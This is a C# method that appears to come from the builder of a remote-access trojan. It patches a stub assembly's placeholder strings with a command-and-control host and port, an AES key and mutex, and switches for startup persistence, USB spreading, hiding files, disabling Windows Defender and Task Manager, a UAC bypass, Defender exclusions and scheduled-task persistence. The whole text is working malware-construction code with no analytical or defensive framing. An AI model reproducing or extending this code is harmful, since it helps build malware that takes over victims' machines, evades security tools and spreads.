		private void WriteSettings(ModuleDefMD asmDef)
		{
			try
			{
				string randomString = Methods.GetRandomString(32);
				Aes256 aes = new Aes256(randomString);
				foreach (TypeDef type in asmDef.Types)
				{
					if (!(type.Name == "Program"))
					{
						continue;
					}
					foreach (MethodDef method in type.Methods)
					{
						if (method.Body == null)
						{
							continue;
						}
						for (int i = 0; i < method.Body.Instructions.Count(); i++)
						{
							if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
							{
								continue;
							}
							if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
							{
								method.Body.Instructions[i].Operand = (this.PortNumericUpDown1).Value.ToString();
							}
							if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
							{
								method.Body.Instructions[i].Operand = this.txtHost.Text;
							}
							if (this.chkStartup.Switched && method.Body.Instructions[i].Operand.ToString() == "%Ekinhsh%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (this.chkPers.Switched && method.Body.Instructions[i].Operand.ToString() == "%Pers%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (this.chkAntiK.Switched && method.Body.Instructions[i].Operand.ToString() == "%Prostaths%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (this.chkUSB.Switched && method.Body.Instructions[i].Operand.ToString() == "%USB%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (this.chkHideFo.Switched && method.Body.Instructions[i].Operand.ToString() == "%FakelosEgkat%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (this.chkHideFi.Switched && method.Body.Instructions[i].Operand.ToString() == "%OnomaArxeiou%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (this.chkDelay.Switched)
							{
								((Control)(object)this.numDelay).Enabled = true;
								if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
							}
							if (this.chkDelay.Switched)
							{
								((Control)(object)this.numDelay).Enabled = true;
								if (method.Body.Instructions[i].Operand.ToString() == "%DelayNum%")
								{
									method.Body.Instructions[i].Operand = (this.numDelay).Value.ToString();
								}
							}
							if (this.chkKillWD.Switched && method.Body.Instructions[i].Operand.ToString() == "%Aspida%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (this.chkUac.Switched && method.Body.Instructions[i].Operand.ToString() == "%AlphaOmega%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (this.chkExclude.Switched && method.Body.Instructions[i].Operand.ToString() == "%Exclude%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (this.chkShedule.Switched && method.Body.Instructions[i].Operand.ToString() == "%Yphresia%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (this.chkTaskMgr.Switched && method.Body.Instructions[i].Operand.ToString() == "%TheWatcher%")
							{
								method.Body.Instructions[i].Operand = "true";
							}
							if (method.Body.Instructions[i].Operand.ToString() == "%OnomaArxeiou%")
							{
								method.Body.Instructions[i].Operand = this.txtFileName.Text;
							}
							if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
							{
								method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
							}
							if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
							{
								method.Body.Instructions[i].Operand = aes.Encrypt(this.txtMutex.Text);
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				throw new ArgumentException("WriteSettings: " + ex.Message);
			}
		}

